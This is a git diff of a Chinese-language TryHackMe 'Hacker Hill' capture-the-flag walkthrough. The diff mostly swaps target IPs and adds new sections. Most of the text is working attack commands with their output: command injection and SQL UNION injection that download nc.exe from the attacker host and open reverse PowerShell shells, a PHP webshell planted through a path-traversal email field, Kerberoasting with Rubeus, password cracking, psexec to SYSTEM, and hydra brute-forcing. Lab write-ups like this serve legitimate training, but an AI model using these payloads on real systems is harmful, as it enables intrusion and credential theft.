@@ -1,4 +1,4 @@
-# 免责声明
+hackerhill# 免责声明
 >本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。
 
 # Easy Challenge
@@ -129,10 +129,10 @@ bash-4.4# cat /root/root.txt
 
 ```
 ┌──(root💀kali)-[~/tryhackme/hackhill]
-└─# nmap -sV -Pn 10.10.75.159                                                                                                                                                                                                         130 ⨯
+└─# nmap -sV -Pn 10.10.48.179                                                                                                                                                                                                         130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 10:00 EDT
-Nmap scan report for 10.10.75.159
+Nmap scan report for 10.10.48.179
 Host is up (0.32s latency).
 Not shown: 985 filtered ports
 PORT     STATE SERVICE       VERSION
@@ -160,18 +160,18 @@ PORT     STATE SERVICE       VERSION
 # 80
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.75.159
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.48.179
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/tryhackme/dirsearch/reports/10.10.75.159/_21-10-25_10-10-52.txt
+Output File: /root/tryhackme/dirsearch/reports/10.10.48.179/_21-10-25_10-10-52.txt
 
 Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-10-52.log
 
-Target: http://10.10.75.159/
+Target: http://10.10.48.179/
 
 [10:10:53] Starting: 
 [10:11:00] 200 -    2KB - /%3f/                                            
@@ -191,18 +191,18 @@ Target: http://10.10.75.159/
 # 81
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.75.159:81
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.48.179:81
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/tryhackme/dirsearch/reports/10.10.75.159-81/_21-10-25_10-27-15.txt
+Output File: /root/tryhackme/dirsearch/reports/10.10.48.179-81/_21-10-25_10-27-15.txt
 
 Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-27-15.log
 
-Target: http://10.10.75.159:81/
+Target: http://10.10.48.179:81/
 
 [10:27:16] Starting: 
 [10:27:22] 200 -    5KB - /%3f/                                            
@@ -216,18 +216,18 @@ Target: http://10.10.75.159:81/
 # 82
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.75.159:82
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.48.179:82
 
   _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                             
  (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
                                                                                                                                                                                                                                              
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/tryhackme/dirsearch/reports/10.10.75.159-82/_21-10-25_10-29-15.txt
+Output File: /root/tryhackme/dirsearch/reports/10.10.48.179-82/_21-10-25_10-29-15.txt
 
 Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-29-15.log
 
-Target: http://10.10.75.159:82/
+Target: http://10.10.48.179:82/
 
 [10:29:16] Starting: 
 [10:29:24] 403 -  312B  - /%2e%2e//google.com                              
@@ -258,7 +258,7 @@ Target: http://10.10.75.159:82/
 
 # 枚举数据库
 ```
-sqlmap -u "http://10.10.75.159:81/ping?id=1" -p "id"  --batch --dbms=mysql --technique B --dbs
+sqlmap -u "http://10.10.48.179:81/ping?id=1" -p "id"  --batch --dbms=mysql --technique B --dbs
 available databases [2]:
 [*] information_schema
 [*] networkmonitor
@@ -273,7 +273,7 @@ available databases [2]:
 
 # getshell  
 这个shell一直打不出来，这里参考大佬的方法
-在```http://10.10.75.159/profile```页面，用户名这个字段可以自由修改
+在```http://10.10.48.179/profile```页面，用户名这个字段可以自由修改
 而且每次修改完，上传后的路径随即也会被改变
 由此可以猜想上传代码可能为：
 ```
@@ -300,19 +300,19 @@ tcpdump -i tun0 icmp
 └─# tcpdump -i tun0 icmp                                                                                                                                                                                                                 1 ⨯
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
-09:36:08.012297 IP 10.10.75.159 > 10.13.21.169: ICMP echo request, id 1, seq 13, length 40
-09:36:08.012335 IP 10.13.21.169 > 10.10.75.159: ICMP echo reply, id 1, seq 13, length 40
-09:36:09.008655 IP 10.10.75.159 > 10.13.21.169: ICMP echo request, id 1, seq 14, length 40
-09:36:09.008693 IP 10.13.21.169 > 10.10.75.159: ICMP echo reply, id 1, seq 14, length 40
-09:36:10.024224 IP 10.10.75.159 > 10.13.21.169: ICMP echo request, id 1, seq 15, length 40
-09:36:10.024241 IP 10.13.21.169 > 10.10.75.159: ICMP echo reply, id 1, seq 15, length 40
-09:36:11.047680 IP 10.10.75.159 > 10.13.21.169: ICMP echo request, id 1, seq 16, length 40
-09:36:11.047696 IP 10.13.21.169 > 10.10.75.159: ICMP echo reply, id 1, seq 16, length 40
+09:36:08.012297 IP 10.10.48.179 > 10.13.21.169: ICMP echo request, id 1, seq 13, length 40
+09:36:08.012335 IP 10.13.21.169 > 10.10.48.179: ICMP echo reply, id 1, seq 13, length 40
+09:36:09.008655 IP 10.10.48.179 > 10.13.21.169: ICMP echo request, id 1, seq 14, length 40
+09:36:09.008693 IP 10.13.21.169 > 10.10.48.179: ICMP echo reply, id 1, seq 14, length 40
+09:36:10.024224 IP 10.10.48.179 > 10.13.21.169: ICMP echo request, id 1, seq 15, length 40
+09:36:10.024241 IP 10.13.21.169 > 10.10.48.179: ICMP echo reply, id 1, seq 15, length 40
+09:36:11.047680 IP 10.10.48.179 > 10.13.21.169: ICMP echo request, id 1, seq 16, length 40
+09:36:11.047696 IP 10.13.21.169 > 10.10.48.179: ICMP echo reply, id 1, seq 16, length 40
 ```
 
 把nc.exe传到靶机，以便我们反弹shell
 ```
-curl -H "Cookie:token=eyJ1c2VybmFtZSI6ImFkbWluIiwiY29va2llIjoiZWRkYjkzY2UxODY5OTkwZDMyY2Y3ZWMzYTQyYWQxYzgifQ==" -XPOST http://10.10.75.159/profile -d 'username=asd | powershell curl 10.13.21.169:8000/nc.exe -o nc.exe'
+curl -H "Cookie:token=eyJ1c2VybmFtZSI6ImFkbWluIiwiY29va2llIjoiZWRkYjkzY2UxODY5OTkwZDMyY2Y3ZWMzYTQyYWQxYzgifQ==" -XPOST http://10.10.48.179/profile -d 'username=asd | powershell curl 10.13.21.169:8000/nc.exe -o nc.exe'
 ```
 
 另起一个窗口监听
@@ -328,7 +328,7 @@ admin1 | nc.exe 10.13.21.169 4242 -e powershell
 ┌──(root💀kali)-[~]
 └─# nc -lnvp 4242       
 listening on [any] 4242 ...
-connect to [10.13.21.169] from (UNKNOWN) [10.10.75.159] 50099
+connect to [10.13.21.169] from (UNKNOWN) [10.10.48.179] 50099
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -371,21 +371,21 @@ payload如下：
 
 由于我们现在已经可以注入命令，像前面那个shell一样我们把nc.exe传到靶机，然后再攻击机开启监听，拿到反弹shell
 
-# 传nc.exe
+## 传nc.exe
 ```id=9999 UNION SELECT NULL,CONCAT("|","powershell curl 10.13.21.169:8000/nc.exe -o nc.exe")-- -```
 
-# 本地监听
+## 本地监听
 ```nc -lnvp 4444```
 
-# 反弹
+## 反弹
 ```id=9999 UNION SELECT NULL,CONCAT("|","nc.exe 10.13.21.169 4444 -e powershell")-- -```
 
-# 拿shell、
+## 拿shell
 ```
 ──(root💀kali)-[~/tryhackme/hackerhill]
 └─# nc -lnvp 4444
 listening on [any] 4444 ...
-connect to [10.13.21.169] from (UNKNOWN) [10.10.75.159] 52658
+connect to [10.13.21.169] from (UNKNOWN) [10.10.48.179] 52658
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -397,3 +397,272 @@ troy\helen
 ```
 
 在```C:\Users\helen\Desktop```拿到helen的flag
+
+# 第三个shell
+82端口这个webapp的getshell非常的trick，以下解法参考了大佬的方法
+
+## 分析
+首先这是一个提交框，数据被提交到后台以后，在第二页的源代码注释会出现这样一行文字：
+>Ticket saved to ../tickets/
+
+但是无论我们怎么访问，正常情况下都是不能访问tickets这个文件夹的
+
+因为按照之前的经验，所有的webapp其实都是在public下，所以只要我们能够引导这个路径到public下，理论上我们就能在web上访问到tikeit的内容
+
+经过测试Email Address这个字段可以接受双引号，邮箱格式结尾也允许```.php```
+
+因此我们的payload如下：
+*Email Address: "../public/"@admin.php*
+*Name:      <?php system($_GET['c']); ?\>*
+*Message:     <?php system($_GET['c']); ?\>*
+
+
+上传以后显示：
+>saved to ../tickets/../public/@aaa.php 
+
+触发访问：
+
+```http://10.10.48.179:82/@aaa.php?c=whoami```
+
+页面显示whoami命令返回
+
+现在我们得到了一个简单的交互式shell
+
+## 传nc.exe
+```http://10.10.48.179:82/@aaa.php?c=powershell curl 10.13.21.169:8000/nc.exe -o nc.exe```
+
+
+## 本地监听
+```nc -lnvp 4445```
+
+
+## 反弹
+```http://10.10.48.179:82/@aaa.php?c=nc.exe 10.13.21.169 4445 -e powershell```
+
+
+## 拿shell
+```
+┌──(root💀kali)-[~/tryhackme/hackerhill]
+└─# nc -lnvp 4445
+listening on [any] 4445 ...
+connect to [10.13.21.169] from (UNKNOWN) [10.10.48.179] 49810
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Users\hector\Desktop\WebApp\h1-tryhackme-medium-three-main\public> whoami
+whoami
+troy\hector
+```
+
+在```C:\Users\hector\Desktop```拿到hector的flag
+
+# 提权
+把Rubeus.exe传到靶机
+```
+PS C:\Users\hector\Desktop> powershell curl 10.13.21.169:8000/Rubeus.exe -o Rubeus.exe
+powershell curl 10.13.21.169:8000/Rubeus.exe -o Rubeus.exe  
+```
+
+dump出用户哈希存到hash.txt
+```
+PS C:\Users\hector\Desktop> .\Rubeus.exe kerberoast /outfile:dump.txt
+.\Rubeus.exe kerberoast /outfile:dump.txt
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.0 
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : troy.thm
+[*] Searching path 'LDAP://TROY-DC.troy.thm/DC=troy,DC=thm' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : achilles
+[*] DistinguishedName      : CN=Achilles,OU=Created Users,DC=troy,DC=thm
+[*] ServicePrincipalName   : TIME/TROY-DC.TROY.THM
+[*] PwdLastSet             : 19/02/2021 18:32:09
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Users\hector\Desktop\dump.txt
+
+[*] Roasted hashes written to : C:\Users\hector\Desktop\dump.txt
+```
+
+把dump.txt传回kali，用john破解
+```
+┌──(root💀kali)-[~/tryhackme/hackerhill]
+└─# john dump.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+winniethepooh    (?)
+1g 0:00:00:00 DONE (2021-10-28 02:40) 50.00g/s 153600p/s 153600c/s 153600C/s slimshady..dangerous
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+```
+
+得到achilles的登陆密码
+
+登陆Achilles的账号，发现原来已经是system权限
+```
+┌──(root💀kali)-[~/windowns-privilege/impacket]
+└─# /opt/impacket/build/scripts-3.9/psexec.py TROY.thm/Achilles:winniethepooh@10.10.48.179
+Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.48.179.....
+[*] Found writable share ADMIN$
+[*] Uploading file cbyYanQp.exe
+[*] Opening SVCManager on 10.10.48.179.....
+[*] Creating service CRPo on 10.10.48.179.....
+[*] Starting service CRPo.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1757]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+因为已经拿到了system权限，至此我们拿到了此靶机的所有flag
+
+# Hard Challenge
+
+服务发现
+```
+┌──(root💀kali)-[~/tryhackme/hackerhill]
+└─# nmap -sV -Pn 10.10.111.137    
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-28 04:04 EDT
+Nmap scan report for 10.10.111.137
+Host is up (0.33s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+81/tcp   open  http    nginx 1.18.0 (Ubuntu)
+82/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+8888/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.8.5)
+9999/tcp open  abyss?
+```
+
+开了两个ssh服务，以及4个http服务，8888那个端口用的是python做的webapp
+
+我们一个个查看。。。
+
+## 渗透80端口的http服务
+目录爆破
+```
+┌──(root💀kali)-[~/dirsearch]
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.111.137                                                                      
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
+
+Output File: /root/dirsearch/reports/10.10.111.137/_21-10-28_04-15-43.txt
+
+Error Log: /root/dirsearch/logs/errors-21-10-28_04-15-43.log
+
+Target: http://10.10.111.137/
+
+[04:15:44] Starting: 
+                                       
+[04:16:50] 200 -  136B  - /api                                              
+[04:16:50] 200 -  136B  - /api/    
+[04:17:27] 200 -    2KB - /login                                            
+[04:17:28] 200 -    2KB - /login/                                           
+[04:17:29] 302 -    0B  - /logout  ->  /login                               
+[04:17:29] 302 -    0B  - /logout/  ->  /login                              
+[04:17:52] 302 -    0B  - /shell  ->  /login                                
+[04:17:52] 302 -    0B  - /shell/  ->  /login   
+```
+
+我们看到至少有三个文件夹，shell这个文件夹应该有有趣的东西，但是重定向到了login
+api文件夹可以正常打开，打印了一串json，暴露出来Apache，php,mysql的版本号，数据库名字：servermanager
+
+>{"name":"Server Manager","stack":{"nginx":"Apache\/2.4.41 (Ubuntu)","php":"7.4.3","mysql":{"version":"5.6","database":"servermanager"}}}
+
+login页面源代码显示，如果成功登录，将被导向一个token页面,并且可以携带一个参数
+```
+<script>
+    $('.login').click( function(){
+
+        $.post('/api/user/login',{
+            'username'  :   $('input[name="username"]').val(),
+            'password'  :   $('input[name="password"]').val()
+        },function(resp){
+            if( resp.login ){
+                window.location = '/token?token=' + resp.token;
+            }else{
+                alert( resp.error );
+            }
+        });
+
+
+    })
+</script>
+```
+
+看样子像是一个servermanager数据库的登陆页面。不知道用户名
+
+hydra -f -V -l hill -P /usr/share/wordlists/rockyou.txt 10.10.111.137 http-post-form "/api/user/login:username=^USER^&password=^PASS^&Login=Login:Invalid username"
+
+davelarkin
+
+hydra -f -V -l davelarkin -P /usr/share/wordlists/rockyou.txt 10.10.111.137 ssh
+
+
+sqlmap -r data --technique T --level=5 --risk=3 --dbms=mysql -p "password"
+
+# 82端口
+一个搜索框，在burpsuite上把搜索请求信息截取出来,保存到data2文件
+```
+└─# cat data2              
+POST /search HTTP/1.1
+Host: 10.10.111.137:82
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Origin: http://10.10.111.137:82
+Connection: close
+Referer: http://10.10.111.137:82/search
+Upgrade-Insecure-Requests: 1
+
+q=a
+
+```
+
+sqlmap测试证实存在sql注入，payload为：
+sqlmap -r data2 --level=5 --risk=3  --dbms=mysql 
+
+```
+  Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: q=1%' AND 3240=3240 AND 'UEDj%'='UEDj
+```
+
+枚举到的信息有：
+数据库：hillpics
+表：hill
+当前用户：'hill'@'localhost'
+密码：无法获取
+当前用户角色和权限： USAGE （最低权限）
+os-shell:无法获取
+
+
